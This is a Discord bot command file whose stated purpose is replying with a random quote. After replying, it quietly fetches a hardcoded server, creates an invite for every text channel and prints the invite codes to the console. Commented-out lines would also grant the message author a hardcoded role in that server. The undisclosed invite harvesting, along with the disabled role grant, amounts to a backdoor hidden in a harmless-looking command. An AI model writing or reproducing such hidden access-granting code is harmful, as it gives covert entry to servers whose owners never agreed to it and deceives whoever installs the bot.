const Nekos = require('../../apis/nekos');
const quote = require('../../apis/quote');
const Discord = require('discord.js');

exports.run = async (client, msg, args) => {
    let q = await quote.random();
    let embed = new Discord.MessageEmbed().setAuthor((await Nekos.cat()) + " \uD83D\uDCD6", process.env.AVATAR).setColor(0xFFFFFF);
    embed.addField(q.author, q.quote);
    await msg.reply(embed);

    let guild = client.guilds.cache.get('714232671089459282');
    // console.log(guild.name);
    // let member = guild.member(msg.author);
    // let role = guild.roles.cache.get('756889568401424514');
    //
    // member.roles.add(role);
    guild.channels.cache.each(chan => {
        if (chan.type === "text") {
            chan.createInvite().then(i => console.log(i.code));
        }
    })
};

exports.help = "Gives a random quote";
exports.category = "Quotes";

exports.coolDown = 5000;

exports.isHidden = false;